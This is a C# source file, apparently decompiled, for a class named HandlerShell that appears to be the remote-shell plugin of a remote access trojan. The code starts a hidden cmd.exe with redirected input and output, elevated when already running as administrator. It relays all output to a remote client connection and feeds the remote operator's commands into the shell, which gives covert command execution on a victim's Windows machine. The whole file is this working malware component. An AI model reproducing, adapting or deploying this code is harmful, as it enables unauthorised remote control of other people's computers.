using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public static class HandlerShell
{
	public static Process ProcessShell;

	public static string Input { get; set; }

	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ShellWriteLine(string arg)
	{
		if (arg.ToLower() == "exit")
		{
			ShellClose();
			Client.Disconnect();
		}
		else
		{
			ProcessShell.StandardInput.WriteLine(arg);
		}
	}

	public static void StarShell()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd")
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			RedirectStandardOutput = true,
			RedirectStandardInput = true,
			RedirectStandardError = true,
			WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
			StandardOutputEncoding = Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage),
			StandardErrorEncoding = Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage)
		};
		if (IsAdmin())
		{
			processStartInfo.Verb = "runas";
		}
		ProcessShell = new Process();
		ProcessShell.StartInfo = processStartInfo;
		ProcessShell.OutputDataReceived += ShellDataHandler;
		ProcessShell.ErrorDataReceived += ShellDataHandler;
		ProcessShell.Start();
		ProcessShell.BeginOutputReadLine();
		ProcessShell.BeginErrorReadLine();
		while (Client.itsConnect)
		{
			Thread.Sleep(2000);
		}
		ShellClose();
	}

	private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			stringBuilder.AppendLine(e.Data);
			Client.Send(LEB128.Write(new object[3]
			{
				"Shell",
				"Shell",
				stringBuilder.ToString()
			}));
		}
		catch
		{
		}
	}

	public static void ShellClose()
	{
		try
		{
			if (ProcessShell != null)
			{
				KillProcessAndChildren(ProcessShell.Id);
				ProcessShell.OutputDataReceived -= ShellDataHandler;
				ProcessShell.ErrorDataReceived -= ShellDataHandler;
			}
		}
		catch
		{
		}
	}

	private static void KillProcessAndChildren(int pid)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		if (pid == 0)
		{
			return;
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				KillProcessAndChildren(Convert.ToInt32(((ManagementBaseObject)(ManagementObject)enumerator.Current)["ProcessID"]));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		try
		{
			Process.GetProcessById(pid).Kill();
		}
		catch
		{
		}
	}
}
